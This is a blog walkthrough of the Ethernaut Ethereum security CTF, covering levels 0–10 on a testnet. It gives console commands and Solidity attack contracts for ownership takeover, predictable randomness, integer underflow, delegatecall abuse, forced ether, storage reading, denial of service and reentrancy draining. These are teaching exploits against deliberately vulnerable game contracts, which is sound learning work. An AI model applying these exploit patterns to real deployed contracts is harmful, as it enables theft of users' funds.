---
title: "Ethernaut - Ethereum CTF Walkthrough"
date: '2021-11-14'
coverImage: "/blog/astrodog.jpeg"
ogImage:
  url: "/blog/astrodog.jpeg"
---


This is a walkthrough of [Ethernaut](https://ethernaut.openzeppelin.com/), an Ethereum security CTF game. It's a good starting place for learning about Ethereum security. I think it's the most beginner-friendly Ethereum security CTF.

### Setup

You need a wallet like [Metamask](https://metamask.io/) to play Ethernaut. I recommend having a dedicated wallet for testing which has no real mainnet ETH in it, just in case you make a mistake.

Select the Rinkeby Test Network as your network in Metamask. Rinkeby is a proof-of-authority blockchain, used for testing. It's completely separate from the mainnet where people conduct real Ethereum transactions.

To complete the Ethernaut CTF challenges, you also need some Rinkeby ETH to fund your transactions. You can get some for free from [this faucet](https://faucet.rinkeby.io/). The faucet can be unreliable and go offline at times, so be patient and keep trying if it doesn't work.

### 0. Hello Ethernaut

Press F12 to open up your browsers dev tools. We will be playing the CTF using the console here.

Click the blue *Get New Instance* button on the bottom of the page

After the level instance contract is deployed, follow the instructions by typing *await contract.info()* into the console. Ethernaut returns a hint.

![Screenshot of console in ethernaut](/blog/ethernaut1.png)

Ethernaut then gives us a trail of hints with contract functions.

*await contract.info1()*
> 'Try info2(), but with "hello" as a parameter.'

*await contract.info2("hello")*

> 'The property infoNum holds the number of the next info method to call.'

*await contract.infoNum()*

> [42, empty]

*await contract.info42()*

> 'theMethodName is the name of the next method.'

*await contract.theMethodName()*

> 'The method name is method7123949.'

*await contract.method7123949()*

> 'If you know the password, submit it to authenticate().'

By looking at *contract.abi* we can see there is a function in this contract called *password*.

*await contract.password()*

> 'ethernaut0'

*await contract.authenticate('ethernaut0')*

This will open a Metamask prompt which will charge us gas for the transaction.

Once the transaction finishes, click the *Submit Instance* button, which will complete the level.

### 1. Fallback

```jsx
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

This is the important part of the contract. The [receive](https://docs.soliditylang.org/en/v0.8.9/contracts.html#receive-ether-function)  function in Solidity will run when the contract is called with empty calldata.

In this case, we can see that the function first requires that we contribute eth to the contract. If we did that, then the contract assigns us as the owner of the contract, which allows us to drain the funds.

*contract.contribute({value: 1})*

This contributes 1 wei (10^18 wei = 1 ether) to the contract. We can check to make sure it worked by calling *await contract.getContribution()* which should return that we contributed 1.

*await contract.sendTransaction({value: 1})*

This sends a message value to the contract without calling a function, which will cause the contract to trigger *receive()*. Now we are the owner of the contract. We can check by running *await contract.owner()* which should match our Metamask address.

Now we can call *await contract.withdraw()* which will send the contract's funds to our address.

We can confirm by looking up the *contract.address* on Etherscan and checking to make sure it has 0 balance.

### 2. Fallout

```jsx
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

The contract is named *Fallout* but the function intended to be the constructor is mistakenly called *Fal1out* with a *1* in the name. Because they don't match, *Fal1out()* becomes a publicly callable function.

All we have to do is call *await Fal1out()* to execute the function and get the ETH.

### 3. Coin Flip

This challenge simulates a random coin flip, allowing you to guess the result of the flip. In order to succeed, you have to guess correctly 10 times in a row. This would be highly unlikely if the coin flip is fair.

Luckily for us, the coin flip is not as random as advertised. The *CoinFlip* contract uses the block number as a seed for randomness.

We can use [Remix](https://remix.ethereum.org/) to create a proxy contract. In the proxy contract, we can use the same formula to calculate the side that the coin will land on. Then we can submit our guess by calling the main contract. Deploy this in Remix and click *guessFlip* 10 times. Each time you should see *await contract.consecutiveWins()* increment by one in your console in Ethernaut.

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Solution {
    // this address is the address of your level instance contract
    address contractAddr = 0x62135780E2903fb91D554b399C02d8daFceAFa96;
		CoinFlip public originalContract = CoinFlip(contractAddr); 
	  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guessFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
            originalContract.flip(!_guess);
        }
    }
}
```

### 4. Telephone

The important part of this contract is below.

```jsx
if (tx.origin != msg.sender) {
      owner = _owner;
    }
```

We need to find a way to make *tx.origin* different from *msg.sender*.

The [difference between them](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml) is that *tx.origin* always refers to the original external account (wallet) that sent the transaction. *msg.sender* refers to the direct thing that sent the transaction. 

We can create a proxy smart contract that calls the original contract for us and passes it our wallet address.

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Solution {
    Telephone originalContract;
    
    function attack() public {
        // this address is the address of your level instance contract
        address contractAddr = 0x72911348CE5197fD66905F60b8c59C61454E57aA;
        originalContract = Telephone(contractAddr);
        originalContract.changeOwner(msg.sender);
    }
}
```

### 5. Token

We can see our current balancer by running *await contract.balanceOf(player)* in the console. It should be 20.

```jsx
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

The contract is trying to do math operations with a *uint* which is dangerous if you're not using the *SafeMath* library or adding checks manually.

Because *_value* is a *uint* the first line of the function will always be true.

If we pass any *_value* greater than the *msg.sender*'s current balance, it will be a negative number, which will underflow the *uint*.

We can run *await contract.transfer("0xF95e4B417963C3Bc65767AA2b4EBD806A5e895F9", 21)* to exploit it. This will underflow since our balance is only 20. Any random address works for the first argument.

### 6. Delegation

This challenge contains two contracts. We need to first figure out which contract is the contract that gets deployed and is the one we can interact with. We can tell it's the second contract (*Delegation*) by running *contract.abi* and looking at the methods.

We can also see the *pwn()* function sets the contract's owner to *msg.sender*. Since it's a delegate call, calling *pwn()* will cause the owner to change to *msg.sender* on the **parent** contract.

First we need the SHA-3 hash of "pwn()" as a string. Metamask injects web3.js into our browser, so we can use that. Or you can use any other way of calculating the SHA-3 hash.

*web3.utils.sha3("pwn()")*

Then we can pass that value as *msg.data* so it executes as a delegate call.

*contract.sendTransaction({data: '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'})*

### 7. Force

This contract is blank! But there are still ways that it can receive ETH. One of those ways is if a different contract self destructs and passes the ETH that it contains to the blank contract.

We can do this in Remix. Set the value to 1 Wei since it will be lost forever.

```jsx
pragma solidity ^0.6.0;

contract Solution {
    // this address is the address of your level instance contract
    address payable ogContract = 0xfD15CC8c0Bc40c929749ba638922CCAB15343a8E;

    function attack() public payable {
        require(msg.value > 0);
        selfdestruct(ogContract);
    }
}
```

### 8. Vault

To solve this, we need to find the value of the *bytes32 private password;* variable. In Solidity, private variables refer to which other contracts are allowed to view/use them. "Private" does not refer to visibility to the contract to the people who use the contract, since EVM state is public.

This is the second variable defined, so we can retrieve the hex with *await web3.eth.getStorageAt(contract.address, 1)*

Then we can hex decode the result if we want, but we will be passing the hex value to the *unlock()* function. *await web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")*

Another way to find the password is to view the EVM state of the creation transaction on Etherscan.

<pic>

*await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")*

### 9. King

In this level we have to become the King by contributing more ETH than was in the pool before. Then we have to stay the king by breaking the contract.

We can cause this line in the contract to fail *king.transfer(msg.value);* by calling this from our own smart contract and not specifying a payable fallback function.

```jsx
pragma solidity ^0.5.17;

contract Solution {
    constructor() public payable {
        // this address is the address of your level instance contract
        address payable contractAddr = 0xc1262E0eB785971B481B2Ec89f86fcB51E62f68f;
        address(contractAddr).call.value(msg.value)("");
    }
    
    function() external payable {
        revert("lmao sucks");
    }
}
```

If we write this on Remix and then deploy it with 1 ETH, it should make us king.

You can check by running *await contract._king()* in the console. It should show the address of our deployed contract.

### 10. Reentrancy

Reentrancy in Solidity is when a function can be interrupted in the middle of execution and then called again repeatedly by an external contract. This is what happened in the DAO hack.

We can create our own malicious smart contract that will reenter the original contract using the *withdraw()* function. We need to seed this contract with 1 ETH to pass the initial check. That's what the *ogContract.donate{ value: 1 ether}(address(this));* does. Then the original contract will run *withdraw()* and transfer funds to our attacking contract. It will trigger our *fallback()* function, which will call *withdraw()* again. This process repeats until we've drained the ETH from the original contract.

```jsx
pragma solidity ^0.6.4;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Solution {
    Reentrance ogContract;

    constructor(address payable reentranceContactAddress) public payable {
        ogContract = Reentrance(reentranceContactAddress);
    }
    
    function attack() public {
        ogContract.donate{ value: 1 ether}(address(this));
        ogContract.withdraw(1 ether);
    }
    
    fallback() external payable {
        if(address(ogContract).balance >= 1 ether) {
            ogContract.withdraw(1 ether);
        }
    }
    
}
```